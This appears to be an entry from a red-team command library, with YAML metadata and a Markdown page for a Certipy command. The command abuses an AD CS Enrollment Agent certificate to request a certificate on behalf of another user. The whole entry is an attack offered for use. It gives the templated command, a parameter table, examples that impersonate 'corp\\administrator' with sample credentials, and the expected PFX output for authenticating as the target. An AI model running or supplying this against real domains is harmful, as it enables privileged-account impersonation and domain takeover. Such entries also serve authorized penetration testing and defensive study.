---
id: fe6797c2-e232-4d3f-a4c8-e119c9e696f8
name: certipy-request-certificate-on-behalf-of-user
type: command
executor: bash
data: >-
  certipy req '$_DOMAIN/$_USERNAME:$_PASSWORD@$_CA_SERVER' -ca '$_CA_NAME'
  -template '$_TEMPLATE' -on-behalf-of '$_TARGET_USER' -pfx '$_OUTPUT_FILE.pfx'
output: null
created_at: '2023-04-06T03:56:05.821088+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ADCS
  - Certificate Abuse
  - Privilege Escalation
verified: true
validated: true
---

# certipy-request-certificate-on-behalf-of-user

## Command

```bash
certipy req '$_DOMAIN/$_USERNAME:$_PASSWORD@$_CA_SERVER' -ca '$_CA_NAME' -template '$_TEMPLATE' -on-behalf-of '$_TARGET_USER' -pfx '$_OUTPUT_FILE.pfx'
```

## Description

This command leverages an existing Enrollment Agent certificate to request a new certificate on behalf of a target user from ADCS. It exploits misconfigurations to impersonate privileged accounts without their direct credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | The domain name (e.g., corp.local) | Yes |
| $_USERNAME | The authenticating username | Yes |
| $_PASSWORD | The password for authentication | Yes |
| $_CA_SERVER | FQDN of the CA server (e.g., ca.corp.local) | Yes |
| -ca $_CA_NAME | Name of the CA (e.g., corp-CA) | Yes |
| -template $_TEMPLATE | The target template (e.g., User) | Yes |
| -on-behalf-of $_TARGET_USER | The user to impersonate (e.g., corp\\administrator) | Yes |
| -pfx $_OUTPUT_FILE.pfx | Output PFX filename (e.g., john.pfx) | Yes |

## Examples

### Basic Usage

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'admin.pfx'
```

### Advanced Usage

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'admin.pfx' -debug
```

## Expected Output

[*] Saved certificate and private key to 'admin.pfx'

Success creates a PFX file usable for authenticating as the target user.

## Related

- [[procedures/Request-Certificate-on-Behalf-of-User-via-Misconfigured-Enrollment-Agent-Templates]]
- [[tools/Certipy]]
